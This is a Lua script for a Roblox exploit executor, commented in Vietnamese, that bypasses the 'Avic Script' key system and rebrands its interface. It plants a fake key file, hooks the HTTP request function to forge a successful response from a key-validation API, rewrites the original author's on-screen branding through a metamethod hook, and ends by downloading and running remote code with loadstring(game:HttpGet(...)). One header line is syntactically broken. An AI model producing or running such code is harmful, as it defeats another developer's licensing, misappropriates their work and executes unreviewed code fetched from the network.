-- ==========================================
-- Bypasser & Rebrander for Avic Script
-- Custom Key: "vtrip" (Auto Skip & Rebrand UI)
-- ==========================================

local HttpService = game:GetService("HttpService")

-- ==========================================
-- 1. TẠO FILE ĐỂ AUTO-SKIP NHẬP KEY
-- ==========================================
-- Script gốc thường check file "AvicKey_Save.txt" trong thư mục workspace của executor
if writefile then
    writefile("AvicKey_Save.txt", "vtrip")
    print("✅ Đã tạo file AvicKey_Save.txt, tự động đăng nhập bằng key 'vtrip'")
else
    warn("Executor của bạn không hỗ trợ writefile, bạn vẫn phải nhập tay!")
end

-- ==========================================
-- 2. HOOK HTTP REQUEST (BYPASS AUTH)
-- ==========================================
local requestFunc = request or http_request or (http and http.request) or (syn and syn.request)

if requestFunc then
    local oldRequest
    oldRequest = hookfunction(requestFunc, function(options)
        if type(options) == "table" and options.Url and string.find(options.Url, "pandadevelopment.net/api/v1/keys/validate") then
            if options.Body then
                local success, bodyData = pcall(function()
                    return HttpService:JSONDecode(options.Body)
                end)
                
                if success and type(bodyData) == "table" and bodyData.Key == "vtrip" then
                    return {
                        Success = true,
                        StatusCode = 200,
                        StatusMessage = "OK",
                        Headers = { = "application/json; charset=utf-8"
                        },
                        Body = HttpService:JSONEncode({
                            Authenticated_Status = "Success",
                            Note = "Bypassed successfully",
                            Expire_Date = "Infinite",
                            Key_Premium = true
                        })
                    }
                end
            end
        end
        return oldRequest(options)
    end)
end

-- ==========================================
-- 3. HOOK METAMETHOD ĐỂ ĐỔI TEXT (REBRANDING)
-- ==========================================
local oldNewIndex
oldNewIndex = hookmetamethod(game, "__newindex", function(instance, property, value)
    -- Nếu script đang cố gắng gán giá trị cho thuộc tính "Text" (Ví dụ: TextLabel.Text = ...)
    if property == "Text" and type(value) == "string" then
        
        -- Dùng string.gsub để tìm và thay thế (Lưu ý: dấu . trong Lua là ký tự đặc biệt nên phải thêm % đằng trước)
        value = string.gsub(value, "Discord%.gg/AvicScript", "Powered By MT Studio")
        value = string.gsub(value, "Avic", "Taokotenl")
        
    end
    
    -- Trả quyền lại cho game để hiển thị đoạn Text đã được sửa
    return oldNewIndex(instance, property, value)
end)

print("✅ Đã cài đặt Hook UI và Bypass thành công!")

-- ==========================================
-- 4. CHẠY SCRIPT GỐC
-- ==========================================
loadstring(game:HttpGet("https://venxy.wasmer.app/index.php/raw/Avic.lua"))()